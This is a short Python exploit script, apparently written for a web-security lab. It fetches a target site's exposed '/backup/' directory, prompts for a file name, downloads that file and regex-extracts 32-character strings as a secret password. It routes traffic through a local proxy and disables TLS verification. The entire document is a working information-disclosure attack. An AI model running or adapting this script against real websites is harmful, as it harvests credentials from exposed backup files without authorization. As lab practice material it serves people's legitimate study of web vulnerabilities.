import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url):
    res = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    
    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None

def information_disclosure_exploit(session, url) :
    
    exploit_url = url+'/backup/'
    res = session.get(exploit_url, verify=False, proxies=proxies)
     
    if res.status_code == 200 :
        print(res.text)
        filename = input("Put the file name here : ")
        exploit_url += filename.strip("\n")
        r = session.get(exploit_url, verify=False, proxies=proxies)
        
        if r.status_code == 200 :
            soup = BeautifulSoup(r.text, "html.parser")
            pattern = r"[0-9a-zA-Z]{32}"
            secret = re.findall(pattern, str(soup))
            print("The secret password is : " + str(secret))
        else :
            print("Failed to exploit the vulnerability!")
            
    else :
        print("Failed to exploit the vulnerability!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    information_disclosure_exploit(session, url)